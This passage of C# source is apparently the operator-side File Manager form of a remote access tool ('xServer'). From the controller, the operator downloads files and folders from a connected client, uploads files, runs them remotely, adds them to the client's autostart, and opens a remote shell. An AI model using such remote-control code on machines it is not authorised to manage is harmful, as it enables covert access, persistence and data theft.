using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using xServer.Controls;
using xServer.Core.Commands;
using xServer.Core.Data;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Packets.ServerPackets;
using xServer.Core.Utilities;
using xServer.Enums;

namespace xServer.Forms
{
    public partial class FrmFileManager : Form
    {
        private string _currentDir;
        private readonly Client _connectClient;
        private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file uploads
        public Dictionary<int, string> CanceledUploads = new Dictionary<int, string>();
        public Dictionary<int, MetaFile> UnfinishedTransfers = new Dictionary<int, MetaFile>();

        private Tuple<bool, int> _searching; // (stillSearch, itemsFound)
        private Dictionary<int, TransferCalculator> _transferEstimates = new Dictionary<int, TransferCalculator>();

        private const int TRANSFER_ID = 0;
        private const int TRANSFER_TYPE = 1;
        private const int TRANSFER_STATUS = 2;
        private const int TRANSFER_SPEED = 4;
        private const int TRANSFER_EST = 5;

        public FrmFileManager(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmFm = this;
            InitializeComponent();

            ProcessUnfinishedTransfers();
            _connectClient.Value.FrmFldr = new FrmDownloadFolder();
        }

        private string GetAbsolutePath(string item)
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.Length == 1)
                    return Path.Combine(_currentDir, item);
                else
                    return Path.Combine(_currentDir + '/', item);
            }

            return Path.GetFullPath(Path.Combine(_currentDir, item));
        }

        private void NavigateUp()
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.LastIndexOf('/') > 0)
                {
                    _currentDir = _currentDir.Remove(_currentDir.LastIndexOf('/') + 1);
                    _currentDir = _currentDir.TrimEnd('/');
                }
                else
                    _currentDir = "/";

                SetCurrentDir(_currentDir);
            }
            else
                SetCurrentDir(GetAbsolutePath(@"..\"));
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.Text = WindowHelper.GetWindowTitle("File Manager", _connectClient);
                new Core.Packets.ServerPackets.GetDrives().Execute(_connectClient);
            }
        }

        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmFm = null;
        }

        private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (_connectClient != null && _connectClient.Value != null)
            {
                SetCurrentDir(cmbDrives.SelectedValue.ToString());
                RefreshDirectory();
            }
        }

        private void lstDirectory_DoubleClick(object sender, EventArgs e)
        {
            if (_connectClient != null && _connectClient.Value != null && lstDirectory.SelectedItems.Count > 0)
            {
                PathType type = (PathType) lstDirectory.SelectedItems[0].Tag;

                switch (type)
                {
                    case PathType.Back:
                        NavigateUp();
                        RefreshDirectory();
                        break;
                    case PathType.Directory:
                        SetCurrentDir(GetAbsolutePath(lstDirectory.SelectedItems[0].SubItems[0].Text));
                        RefreshDirectory();
                        break;
                }
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                PathType type = (PathType) files.Tag;
                string path = GetAbsolutePath(files.SubItems[0].Text);
                int id = FileHelper.GetNewTransferId(files.Index);

                if (type == PathType.File)
                {
                    if (_connectClient != null)
                    {
                        new Core.Packets.ServerPackets.DoDownloadFile(path, id, 0).Execute(_connectClient);
                        AddTransfer(id, "Download", "Pending...", files.SubItems[0].Text);
                    }
                }
                else if (type == PathType.Directory)
                {
                    _connectClient.Value.FrmFldr.RootName = path;
                    new GetDirectory(path, InformationDetail.Simple).Execute(_connectClient);
                    _connectClient.Value.FrmFldr.ShowDialog();

                    if (_connectClient.Value.FrmFldr.Cancelled)
                        return;

                    var items = _connectClient.Value.FrmFldr.SelectedItems;
                    var itemOptions = new List<ItemOption>();

                    if(items != null)
                        for (int i = 0; i < items.Length; i++)
                        {
                            var itm = items[i];
                            if (itm.EndsWith("(ZIP)"))
                            {
                                itemOptions.Add(ItemOption.Compress);
                                items[i] = itm.Substring(0, itm.Length - 6);
                            }
                            else
                                itemOptions.Add(ItemOption.None);
                        }

                    if (_connectClient != null)
                    {
                        var metaFile = new MetaFile(0, id, 0, new byte[16], new byte[16], "", "", TransferType.Folder);
                        metaFile.FolderItems = items;
                        metaFile.FolderItemOptions = itemOptions.ToArray();
                        metaFile.Save(Path.Combine(_connectClient.Value.DownloadDirectory, "temp", id + ".meta"));

                        if (items != null && items.Length > 0)
                            new Core.Packets.ServerPackets.DoDownloadDirectory(path, id, 0, items, itemOptions.ToArray(),
                                DownloadType.Selective).Execute(_connectClient);
                        else
                            new Core.Packets.ServerPackets.DoDownloadDirectory(path, id, 0).Execute(_connectClient);
                        AddTransfer(id, "Download", "Pending...", files.SubItems[0].Text);
                    }
                }
            }
        }


        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Title = "Select files to upload";
                ofd.Filter = "All files (*.*)|*.*";
                ofd.Multiselect = true;

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    foreach (var filePath in ofd.FileNames)
                    {
                        if (!File.Exists(filePath))
                            continue;

                        new Thread(UploadItem).Start(new UploadInformation(filePath, null, true));
                    }
                }
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                PathType type = (PathType) files.Tag;

                if (type == PathType.File)
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);

                    if (_connectClient != null)
                        new Core.Packets.ServerPackets.DoProcessStart(path).Execute(_connectClient);
                }
            }
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                PathType type = (PathType) files.Tag;

                switch (type)
                {
                    case PathType.Directory:
                    case PathType.File:
                        string path = GetAbsolutePath(files.SubItems[0].Text);
                        string newName = files.SubItems[0].Text;

                        if (InputBox.Show("New name", "Enter new name:", ref newName) == DialogResult.OK)
                        {
                            newName = GetAbsolutePath(newName);

                            if (_connectClient != null)
                                new Core.Packets.ServerPackets.DoPathRename(path, newName, type).Execute(_connectClient);
                        }
                        break;
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int count = lstDirectory.SelectedItems.Count;
            if (count == 0) return;
            if (MessageBox.Show(string.Format("Are you sure you want to delete {0} file(s)?", count),
                    "Delete Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (ListViewItem files in lstDirectory.SelectedItems)
                {
                    PathType type = (PathType) files.Tag;

                    switch (type)
                    {
                        case PathType.Directory:
                        case PathType.File:
                            string path = GetAbsolutePath(files.SubItems[0].Text);
                            if (_connectClient != null)
                                new Core.Packets.ServerPackets.DoPathDelete(path, type).Execute(_connectClient);
                            break;
                    }
                }
            }
        }

        private void addToStartupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                PathType type = (PathType) files.Tag;

                if (type == PathType.File)
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);

                    using (var frm = new FrmAddToAutostart(path))
                    {
                        if (frm.ShowDialog() == DialogResult.OK)
                        {
                            if (_connectClient != null)
                                new Core.Packets.ServerPackets.DoStartupItemAdd(AutostartItem.Name, AutostartItem.Path,
                                    AutostartItem.Type).Execute(_connectClient);
                        }
                    }
                }
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RefreshDirectory();
        }

        private void openDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                string path = _currentDir;
                if (lstDirectory.SelectedItems.Count == 1)
                {
                    var item = lstDirectory.SelectedItems[0];
                    PathType type = (PathType) item.Tag;

                    if (type == PathType.Directory)
                    {
                        path = GetAbsolutePath(item.SubItems[0].Text);
                    }
                }

                if (_connectClient.Value.FrmRs != null)
                {
                    new Core.Packets.ServerPackets.DoShellExecute(string.Format("cd \"{0}\"", path)).Execute(
                        _connectClient);
                    _connectClient.Value.FrmRs.Focus();
                }
                else
                {
                    FrmRemoteShell frmRS = new FrmRemoteShell(_connectClient);
                    frmRS.Show();
                    new Core.Packets.ServerPackets.DoShellExecute(string.Format("cd \"{0}\"", path)).Execute(
                        _connectClient);
                }
            }
        }

        private void btnOpenDLFolder_Click(object sender, EventArgs e)
        {
            if (!Directory.Exists(_connectClient.Value.DownloadDirectory))
                Directory.CreateDirectory(_connectClient.Value.DownloadDirectory);

            Process.Start(_connectClient.Value.DownloadDirectory);
        }

        private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.SelectedItems)
            {
                if (!transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Downloading") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Uploading") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Pending") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Paused")) continue;

                int id = int.Parse(transfer.SubItems[TRANSFER_ID].Text);

                if (transfer.SubItems[TRANSFER_TYPE].Text == "Download")
                {
                    if (_connectClient != null)
                        new Core.Packets.ServerPackets.DoDownloadFileCancel(id).Execute(_connectClient);
                    if (!CommandHandler.CanceledDownloads.ContainsKey(id))
                        CommandHandler.CanceledDownloads.Add(id, "canceled");
                    if (CommandHandler.RenamedFiles.ContainsKey(id))
                        CommandHandler.RenamedFiles.Remove(id);
                    UpdateTransferStatus(transfer.Index, "Canceled", 0);
                }
                else if (transfer.SubItems[TRANSFER_TYPE].Text == "Upload")
                {
                    if (!CanceledUploads.ContainsKey(id))
                        CanceledUploads.Add(id, "canceled");
                    UpdateTransferStatus(transfer.Index, "Canceled", 0);
                }
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.Items)
            {
                if (transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Downloading") ||
                    transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Uploading") ||
                    transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Pending") ||
                    transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Paused")) continue;
                transfer.Remove();
            }
        }

        private void lstDirectory_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop)) // allow drag & drop with files
                e.Effect = DragDropEffects.Copy;
        }

        private void lstDirectory_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                string[] files = (string[]) e.Data.GetData(DataFormats.FileDrop);
                foreach (string filePath in files)
                {
                    if (!File.Exists(filePath))
                        continue;
                    string remotePath = Path.Combine(_currentDir, Path.GetFileName(filePath));
                    new Thread(UploadItem).Start(new UploadInformation(filePath, remotePath, true));
                }
            }
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            RefreshDirectory();
        }

        private void FrmFileManager_KeyDown(object sender, KeyEventArgs e)
        {
            // refresh when F5 is pressed
            if (e.KeyCode == Keys.F5 && !string.IsNullOrEmpty(_currentDir) && TabControlFileManager.SelectedIndex == 0)
            {
                RefreshDirectory();
                e.Handled = true;
            }
        }

        public void AddDrives(RemoteDrive[] drives)
        {
            try
            {
                cmbDrives.Invoke((MethodInvoker) delegate
                {
                    cmbDrives.DisplayMember = "DisplayName";
                    cmbDrives.ValueMember = "RootDirectory";
                    cmbDrives.DataSource = new BindingSource(drives, null);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void ClearFileBrowser()
        {
            try
            {
                lstDirectory.Invoke((MethodInvoker) delegate
                {
                    lstDirectory.Items.Clear();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void ClearSearchResults()
        {
            try
            {
                lstSearchResults.Invoke((MethodInvoker) delegate
                {
                    lstSearchResults.Items.Clear();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void AddItemToFileBrowser(string name, string size, PathType type, int imageIndex,
            DateTime lastModificationDate , DateTime creationDate)
        {
            try
            {
                ListViewItem lvi = null;
                if (lastModificationDate == DateTime.MinValue)
                {
                    lvi = new ListViewItem(new string[]
                    {
                        name, size, (type != PathType.Back) ? type.ToString() : string.Empty,
                        null, null
                    })
                    {
                        Tag = type,
                        ImageIndex = imageIndex
                    };
                }
                else
                {
                    lvi = new ListViewItem(new string[]
                    {
                        name, size, (type != PathType.Back) ? type.ToString() : string.Empty,
                        lastModificationDate.ToString(), creationDate.ToString()
                    })
                    {
                        Tag = type,
                        ImageIndex = imageIndex
                    };
                }

                lstDirectory.Invoke((MethodInvoker) delegate
                {
                    lstDirectory.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void AddItemToSearchResults(string name, string size, string parentDirectory, int imageIndex,
            DateTime lastModificationDate, DateTime creationDate)
        {
            try
            {
                ListViewItem lvi = null;
                if (lastModificationDate == DateTime.MinValue)
                {
                    lvi = new ListViewItem(new string[]
                    {name, size, null, null})
                    {
                        Tag = parentDirectory,
                        ImageIndex = imageIndex
                    };
                }
                else
                {
                    lvi = new ListViewItem(new string[]
                    {name, size, lastModificationDate.ToString(), creationDate.ToString()})
                    {
                        Tag = parentDirectory,
                        ImageIndex = imageIndex
                    };
                }

                lstSearchResults.Invoke((MethodInvoker) delegate
                {
                    lstSearchResults.Items.Add(lvi);
                    Application.DoEvents();
                });

                statusStrip.Invoke((MethodInvoker) delegate
                {
                    stripLblFilesFound.Text = string.Format("Found {0} items...", lstSearchResults.Items.Count);
                    if (!_searching.Item1 && lstSearchResults.Items.Count < _searching.Item2)
                    {
                        stripProgressSearch.Value = (int)((double)lstSearchResults.Items.Count / _searching.Item2 * 100);
                        stripLblFilesFound.Text += string.Format(" (processing item backlog {0}/{1})", lstSearchResults.Items.Count, _searching.Item2);
                    }
                    else if (!_searching.Item1 && lstSearchResults.Items.Count >= _searching.Item2)
                    {
                        FinalizeSearch(0);
                    }
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void AddTransfer(int id, string type, string status, string filename)
        {
            try
            {
                ListViewItem lvi =
                    new ListViewItem(new string[] {id.ToString(), type, status, filename, "", ""});

                if (lstDirectory.InvokeRequired)
                {
                    lstDirectory.Invoke((MethodInvoker) delegate
                    {
                        lstTransfers.Items.Add(lvi);
                    });
                }
                else
                {
                    lstTransfers.Items.Add(lvi);
                }
            }
            catch (InvalidOperationException)
            {
            }
        }

        public int GetTransferIndex(int id)
        {
            string strId = id.ToString();
            int index = 0;

            try
            {
                lstTransfers.Invoke((MethodInvoker) delegate
                {
                    foreach (
                        ListViewItem lvi in
                        lstTransfers.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && strId.Equals(lvi.SubItems[TRANSFER_ID].Text)))
                    {
                        index = lvi.Index;
                        break;
                    }
                });
            }
            catch (InvalidOperationException)
            {
                return -1;
            }

            return index;
        }

        public void UpdateTransferStatus(int index, string status, int imageIndex, decimal speed = 0)
        {
            UpdateTransferStatus(index, status, imageIndex, TimeSpan.Zero, speed);
        }

        public void UpdateTransferStatus(int index, string status, int imageIndex, TimeSpan est, decimal speed = 0)
        {
            try
            {
                if (lstTransfers.InvokeRequired)
                {
                    lstTransfers.Invoke((MethodInvoker) delegate
                    {
                        int speedAvg = 0, timeEstAvg = 0;
                        int id = int.Parse(lstTransfers.Items[index].Text);

                        if (_transferEstimates.ContainsKey(id))
                        {
                            _transferEstimates[id].AddSpeed((int) speed);
                            _transferEstimates[id].AddTimeLeft(est.Seconds);

                            speedAvg = _transferEstimates[id].AverageSpeed;
                            timeEstAvg = _transferEstimates[id].AverageTimeLeft;
                        }
                        else
                            _transferEstimates.Add(id, new TransferCalculator());

                        lstTransfers.Items[index].SubItems[TRANSFER_STATUS].Text = status;
                        lstTransfers.Items[index].SubItems[TRANSFER_SPEED].Text = speedAvg == 0
                            ? "n/a"
                            : TransferCalculator.GetSizeSuffix((long) speed);
                        lstTransfers.Items[index].SubItems[TRANSFER_EST].Text = TimeSpan.FromSeconds(timeEstAvg).ToString();
                        if (imageIndex >= 0 || imageIndex == -1)
                            lstTransfers.Items[index].ImageIndex = imageIndex;
                    });
                }
                else
                {
                    int speedAvg = 0, timeEstAvg = 0;
                    int id = int.Parse(lstTransfers.Items[index].Text);

                    if (_transferEstimates.ContainsKey(id))
                    {
                        _transferEstimates[id].AddSpeed((int)speed);
                        _transferEstimates[id].AddTimeLeft(est.Seconds);

                        speedAvg = _transferEstimates[id].AverageSpeed;
                        timeEstAvg = _transferEstimates[id].AverageTimeLeft;
                    }
                    else
                        _transferEstimates.Add(id, new TransferCalculator());

                    lstTransfers.Items[index].SubItems[TRANSFER_STATUS].Text = status;
                    lstTransfers.Items[index].SubItems[TRANSFER_SPEED].Text = speedAvg == 0
                        ? "n/a"
                        : TransferCalculator.GetSizeSuffix((long)speed);
                    lstTransfers.Items[index].SubItems[TRANSFER_EST].Text = TimeSpan.FromSeconds(timeEstAvg).ToString();
                    if (imageIndex >= 0 || imageIndex == -1)
                        lstTransfers.Items[index].ImageIndex = imageIndex;
                }
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception)
            {
            }
        }

        /// <summary>
        /// Sets the current directory of the File Manager.
        /// </summary>
        /// <param name="path">The new path.</param>
        public void SetCurrentDir(string path)
        {
            _currentDir = path;
            try
            {
                txtPath.Invoke((MethodInvoker) delegate
                {
                    txtPath.Text = _currentDir;
                });

                txtSearchDirectory.Invoke((MethodInvoker) delegate
                {
                    txtSearchDirectory.Text = _currentDir;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Sets the status of the File Manager Form.
        /// </summary>
        /// <param name="text">The new status.</param>
        /// <param name="setLastDirectorySeen">Sets LastDirectorySeen to true.</param>
        public void SetStatus(string text, bool setLastDirectorySeen = false)
        {
            try
            {
                if (_connectClient.Value != null && setLastDirectorySeen)
                {
                    SetCurrentDir(Path.GetFullPath(Path.Combine(_currentDir, @"..\")));
                    _connectClient.Value.ReceivedLastDirectory = true;
                }
                statusStrip.Invoke((MethodInvoker) delegate
                {
                    stripLblStatus.Text = "Status: " + text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void RefreshDirectory()
        {
            if (_connectClient == null || _connectClient.Value == null) return;

            if (!_connectClient.Value.ReceivedLastDirectory)
                _connectClient.Value.ProcessingDirectory = false;

            new Core.Packets.ServerPackets.GetDirectory(_currentDir, InformationDetail.Standard).Execute(_connectClient);
            SetStatus("Loading directory content...");
            _connectClient.Value.ReceivedLastDirectory = false;
        }

        private void btnSearch_Click(object sender, EventArgs e)
        {
            if (_connectClient == null || _connectClient.Value == null) return;

            var warningFrm = new FrmSearchWarning();

            if (cbRecursive.Checked && txtSearch.Text.Split(',').Any(x => x.Contains("*.*")))
            {
                warningFrm.ShowDialog();
                if (warningFrm.Choice == WarningChoice.Cancel)
                    return;
            }

            ClearSearchResults();
            stripProgressSearch.Visible = true;

            new Core.Packets.ServerPackets.SearchDirectory(txtSearchDirectory.Text, cbRecursive.Checked, txtSearch.Text,
                    ActionType.Begin, warningFrm.Type, warningFrm.Timeout)
                .Execute(_connectClient);
            SetStatus("Searching...");
        }

        public void FocusSearchResults()
        {
            TabControlFileManager.Invoke((MethodInvoker) delegate
            {
                TabControlFileManager.SelectedTab = tabSearchResults;
            });
        }

        private void clearSearchToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClearSearchResults();
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstSearchResults.SelectedItems.Count == 0)
                return;

            SetCurrentDir(lstSearchResults.SelectedItems[0].Tag as string);
            RefreshDirectory();

            var item = lstDirectory.FindItemWithText(lstSearchResults.SelectedItems[0].Text);
            if (item != null)
                lstDirectory.Invoke((MethodInvoker) delegate
                {
                    item.Selected = true;
                });

            TabControlFileManager.Invoke((MethodInvoker) delegate
            {
                TabControlFileManager.SelectedTab = tabFileExplorer;
            });
        }

        private void lstSearchResults_DoubleClick(object sender, EventArgs e)
        {
            if (lstSearchResults.SelectedItems.Count == 0)
                return;

            SetCurrentDir(lstSearchResults.SelectedItems[0].Tag as string);
            RefreshDirectory();

            var item = lstDirectory.FindItemWithText(lstSearchResults.SelectedItems[0].Text);
            if (item != null)
                lstDirectory.Invoke((MethodInvoker) delegate
                {
                    item.Selected = true;
                    lstDirectory.EnsureVisible(item.Index);
                });

            TabControlFileManager.Invoke((MethodInvoker) delegate
            {
                TabControlFileManager.SelectedTab = tabFileExplorer;
            });
        }

        private void btnSearchMode_Click(object sender, EventArgs e)
        {
            lstDirectory.Height = 375;
            lstDirectory.Location = new Point(lstDirectory.Location.X, 66);
            btnSearchMode.Visible = false;
            btnRefresh.Location = new Point(btnRefresh.Location.X + btnSearchMode.Width, btnRefresh.Location.Y);
            txtPath.Width += btnSearchMode.Width;
        }

        private void btnCancelSearch_Click(object sender, EventArgs e)
        {
            lstDirectory.Height = 405;
            lstDirectory.Location = new Point(lstDirectory.Location.X, 36);
            btnSearchMode.Visible = true;
            btnRefresh.Location = new Point(btnRefresh.Location.X - btnSearchMode.Width, btnRefresh.Location.Y);
            txtPath.Width -= btnSearchMode.Width;
        }

        public void InitializeSearch()
        {
            SetStatus("Searching...");
            FocusSearchResults();
            _searching = Tuple.Create(true, 0);

            txtSearch.Invoke((MethodInvoker) delegate
            {
                txtSearch.Enabled = false;
            });
            txtSearchDirectory.Invoke((MethodInvoker) delegate
            {
                txtSearchDirectory.Enabled = false;
            });
            btnSearch.Invoke((MethodInvoker) delegate
            {
                btnSearch.Enabled = false;
            });
            statusStrip.Invoke((MethodInvoker) delegate
            {
                stripProgressSearch.Style = ProgressBarStyle.Marquee;
                stripProgressSearch.Visible = true;
                stripBtnCancel.Visible = true;
            });
            // In case the context menu handle is not yet created we need to do this
            if (contextMenuStripSearch.InvokeRequired)
            {
                contextMenuStripSearch.Invoke((MethodInvoker) delegate
                {
                    clearSearchToolStripMenuItem.Enabled = false;
                });
            }
            else
                clearSearchToolStripMenuItem.Enabled = false;
        }

        public void FinalizeSearch(int finalCount)
        {
            _searching = Tuple.Create(false, finalCount);

            if (lstSearchResults.Items.Count >= finalCount)
            {
                CommandHandler.BacklogTokenSource.Cancel();
                SetStatus("Finished searching");

                if (contextMenuStripSearch.InvokeRequired)
                {
                    contextMenuStripSearch.Invoke((MethodInvoker) delegate
                    {
                        clearSearchToolStripMenuItem.Enabled = true;
                    });
                }
                else
                    clearSearchToolStripMenuItem.Enabled = true;

                txtSearch.Invoke((MethodInvoker) delegate
                {
                    txtSearch.Enabled = true;
                });
                txtSearchDirectory.Invoke((MethodInvoker) delegate
                {
                    txtSearchDirectory.Enabled = true;
                });
                btnSearch.Invoke((MethodInvoker) delegate
                {
                    btnSearch.Enabled = true;
                });
            }
            statusStrip.Invoke((MethodInvoker)delegate
            {
                if (lstSearchResults.Items.Count < finalCount)
                {
                    stripProgressSearch.Style = ProgressBarStyle.Blocks;
                }
                else
                {
                    stripProgressSearch.Visible = false;
                    stripBtnCancel.Visible = false;
                }
            });
        }

        private void TabControlFileManager_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (TabControlFileManager.SelectedIndex != 2)
                stripLblFilesFound.Visible = false;
            else
                stripLblFilesFound.Visible = true;
        }

        private void stripBtnCancel_ButtonClick(object sender, EventArgs e)
        {
            if (!_searching.Item1 && lstSearchResults.Items.Count < _searching.Item2)
            {
                // Cancel backlog processing
                CommandHandler.BacklogTokenSource.Cancel();
                _searching = Tuple.Create(false, 0);
                FinalizeSearch(0);
            }
            else
            {
                // Cancel searching
                new SearchDirectory
                {
                    ActionType = ActionType.Stop
                }.Execute(_connectClient);
            }
        }

        private void downloadToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem file in lstSearchResults.SelectedItems)
            {
                string path = Path.Combine((string) file.Tag, file.SubItems[0].Text);

                int id = FileHelper.GetNewTransferId(file.Index);

                if (_connectClient != null)
                {
                    var metaPath = Path.Combine(_connectClient.Value.DownloadDirectory, "temp");
                    foreach (var metaFile in Directory.GetFiles(metaPath))
                    {
                        var metadata = File.ReadAllBytes(metaFile);
                        if (Encoding.Default.GetString(metadata, 12, metadata.Length - 12) == path)
                        {
                            return;
                        }
                    }

                    new Core.Packets.ServerPackets.DoDownloadFile(path, id, 0).Execute(_connectClient);

                    AddTransfer(id, "Download", "Pending...", file.SubItems[0].Text);
                }

            }
        }

        private void createFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var folderCreationForm = new FrmCreateFolder();
            folderCreationForm.ShowDialog();

            if (folderCreationForm.FolderName != null)
            {
                new DoCreateDirectory(folderCreationForm.FolderName, _currentDir).Execute(_connectClient);
            }
        }

        private void ProcessUnfinishedTransfers()
        {
            var metaPath = Path.Combine(_connectClient.Value.DownloadDirectory, "temp");

            if (!Directory.Exists(metaPath))
            {
                try
                {
                    Directory.CreateDirectory(metaPath);
                }
                catch
                {
                    return;
                }
            }

            var remotePaths = new List<string>();
            var remoteSampleHashes = new List<byte>();
            var remoteTransferIds = new List<int>();

            foreach (var file1 in Directory.GetFiles(metaPath))
            {
                MetaFile metaFile;

                try
                {
                    metaFile = new MetaFile(File.ReadAllBytes(file1));
                }
                catch
                {
                    try
                    {
                        File.Delete(file1);
                    }
                    catch
                    {
                        
                    }
                    continue;
                }

                if (metaFile.Type == TransferType.Download)
                {
                    foreach (var file2 in Directory.GetFiles(_connectClient.Value.DownloadDirectory))
                    {
                        byte[] hashSample = new byte[FileSplit.MAX_BLOCK_SIZE];
                        byte[] hash;

                        using (var fs = new FileStream(file2, FileMode.Open))
                        {
                            fs.Seek(-FileSplit.MAX_BLOCK_SIZE, SeekOrigin.End);
                            fs.Read(hashSample, 0, FileSplit.MAX_BLOCK_SIZE);
                        }
                        using (var md5 = MD5.Create())
                            hash = md5.ComputeHash(hashSample);

                        if (CryptographyHelper.AreEqual(metaFile.PrevHash, hash))
                        {
                            metaFile.CurrentBlock--;
                            metaFile.Save(file1);
                            metaFile = new MetaFile(File.ReadAllBytes(file1));
                        }

                        if (!CryptographyHelper.AreEqual(metaFile.CurHash, hash))
                            return;

                        AddTransfer(metaFile.TransferId, "Download", string.Format("Paused ({0}%)", metaFile.Progress),
                            Path.GetFileName(file2));
                        UnfinishedTransfers.Add(metaFile.TransferId, metaFile);
                        UpdateTransferStatus(lstTransfers.Items.Count - 1,
                            string.Format("Paused ({0}%)", metaFile.Progress), 2);
                    }
                }
                else
                {
                    remotePaths.Add(metaFile.RemotePath);
                    remoteSampleHashes.AddRange(metaFile.CurHash);
                    remoteTransferIds.Add(metaFile.TransferId);
                }
            }

            if (remoteSampleHashes.Count % 16 != 0)
                return;

            if (remotePaths.Count + remoteSampleHashes.Count/16 != remoteTransferIds.Count*2
                || remotePaths.Count == 0)
                return;

            new DoVerifyUnfinishedTransfers(remotePaths.ToArray(), remoteSampleHashes.ToArray(),
                remoteTransferIds.ToArray()).Execute(_connectClient);
        }

        private void resumeTransferToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstTransfers.SelectedItems)
            {
                var transferId = int.Parse(lvi.SubItems[0].Text);

                if (CommandHandler.PausedDownloads.ContainsKey(transferId))
                {
                    if (CommandHandler.PausedDownloads[transferId].Type == TransferType.Download)
                    {
                        new Core.Packets.ServerPackets.DoDownloadFile(
                            CommandHandler.PausedDownloads[transferId].RemotePath, transferId,
                            CommandHandler.PausedDownloads[transferId].CurrentBlock, true)
                        {
                            FolderItems = CommandHandler.PausedDownloads[transferId].FolderItems,
                            FolderItemOptions = CommandHandler.PausedDownloads[transferId].FolderItemOptions
                        }.Execute(_connectClient);
                        CommandHandler.PausedDownloads.Remove(transferId);
                    }
                }
                else if (CommandHandler.PausedUploads.ContainsKey(transferId))
                {
                    var info = new UploadInformation(CommandHandler.PausedUploads[transferId].LocalPath,
                        CommandHandler.PausedUploads[transferId].RemotePath,
                        false, CommandHandler.PausedUploads[transferId].CurrentBlock, transferId);
                    CommandHandler.PausedUploads.Remove(transferId);

                    new Thread(UploadItem).Start(info);
                }
                else if(UnfinishedTransfers.ContainsKey(transferId))
                {
                    if (UnfinishedTransfers[transferId].Type == TransferType.Download)
                    {
                        if ((UnfinishedTransfers[transferId].Type & TransferType.Folder) == TransferType.Folder)
                        {
                            new Core.Packets.ServerPackets.DoDownloadDirectory(UnfinishedTransfers[transferId].RemotePath,
                             transferId,
                             UnfinishedTransfers[transferId].CurrentBlock).Execute(_connectClient);
                        }
                        else
                        {
                            new Core.Packets.ServerPackets.DoDownloadFile(UnfinishedTransfers[transferId].RemotePath,
                                transferId,
                                UnfinishedTransfers[transferId].CurrentBlock, true)
                            {
                                FolderItems = UnfinishedTransfers[transferId].FolderItems,
                                FolderItemOptions = UnfinishedTransfers[transferId].FolderItemOptions
                            }.Execute(_connectClient);
                        }
                        UnfinishedTransfers.Remove(transferId);
                    }
                    else
                    {
                        new Thread(UploadItem).Start(new UploadInformation(UnfinishedTransfers[transferId].LocalPath,
                            UnfinishedTransfers[transferId].RemotePath,
                            false, UnfinishedTransfers[transferId].CurrentBlock, transferId));
                    }
                }
            }
        }

        private struct UploadInformation
        {
            public string LocalPath { get; private set; }
            public string RemotePath { get; private set; }
            public bool IsFile { get; private set; }
            public int StartBlock { get; private set; }
            public int TransferId { get; private set; }

            public UploadInformation(string localPath, string remotePath, bool isFile, int startBlock = 0, int transferId = 0)
            {
                LocalPath = localPath;
